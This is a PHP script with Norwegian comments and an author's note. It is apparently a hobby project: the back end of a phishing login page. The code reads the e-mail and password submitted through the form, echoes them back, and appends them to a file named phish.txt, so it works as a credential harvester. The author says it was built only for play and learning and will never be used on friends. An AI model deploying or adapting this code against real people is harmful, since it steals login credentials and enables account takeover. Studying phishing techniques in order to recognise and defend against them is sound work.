
```
<?php
if (isset($_POST["login"])) {  // Tar informasjon fra et HTML-form med POST og variabler med det
    $username = $_POST["E-mail"];
    $password = $_POST["password"]; 

    if (empty($username)) { // Sjekk om input boksene på HTML-formet er fylt ut, og hvis ikke, skriv "(X variabel) is not filled in"
        echo "E-mail is not filled in";
    } elseif (empty($password)) {
        echo "Password is not filled in";
    } else {
        echo "E-mail = $username <br>";
        echo "Password = $password <br>";
    }
}

($myfile = fopen("phish.txt", "a")) or die("Unable to open file"); // Åpner en .txt fil med fopen. "a" står for "append", som betyr at den skriver informasjonen på slutten av filen, istedet for å overwrite informasjon som allerede ligger der.
fwrite($myfile, "E-mail: $username \n"); // Skriver $username variablen inn i .txt filen den åpnet forrige linje.
fwrite($myfile, "Password: $password \n"); // Skriver $password variablen inn i samme .txt fil som $username.
fclose($myfile); // Lukker filen
?>

```

**Hvorfor lagde jeg denne phishing siden?**

Siden er ikke ment til å faktisk phishe noen, men var ment bare for lek og læring. Jeg kommer selvfølgelig aldri til å legge den ut og phishe homiesene mine (Det går imot bro-codexen)